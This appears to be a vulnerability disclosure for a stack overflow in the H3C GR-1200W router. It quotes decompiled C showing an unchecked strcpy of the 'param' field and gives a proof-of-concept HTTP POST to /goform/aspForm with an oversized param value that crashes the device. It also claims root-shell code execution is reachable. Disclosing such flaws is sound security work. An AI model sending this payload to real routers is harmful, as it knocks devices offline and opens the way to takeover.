### Affected product

```
H3C GR-1200W
```
In function sub_4ACC30,the content obtained by the program from the parameter "param" is passed to v2 .Then the v2 is directly copied into the v3 stack through the strcpy function.
There is no size check, so there is a stack overflow vulnerability.The attacker can easily perform a Deny of Service Attack or Remote Code 
Execution with carefully crafted overflow data.

### Detail

```c
int __fastcall sub_4ACC30(int a1)
{
  const char *v2; // [sp+28h] [+28h]
  int v3[9]; // [sp+2Ch] [+2Ch] BYREF

  v3[0] = 0;
  v3[1] = 0;
  v3[2] = 0;
  v3[3] = 0;
  v3[4] = 0;
  v3[5] = 0;
  v3[6] = 0;
  v3[7] = 0;
  v2 = (const char *)sub_4E58C8(a1, "param", &unk_4FFD30);
  strcpy((char *)v3, v2);
  CFG_Set(0, 505155584, v3);
  return 0;
}
```
### POC

```python
POST /goform/aspForm HTTP/1.1
Host: 192.168.0.11:80
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: https://121.226.152.63:8443/router_password_mobile.asp
Content-Type: application/x-www-form-urlencoded
Content-Length: 553
Origin: https://192.168.0.124:80
DNT: 1
Connection: close
Cookie: JSESSIONID=5c31d502
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

CMD=aVersionSet&param=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,;

```




You can see the router crash, and finally we can write an exp to get a root shell
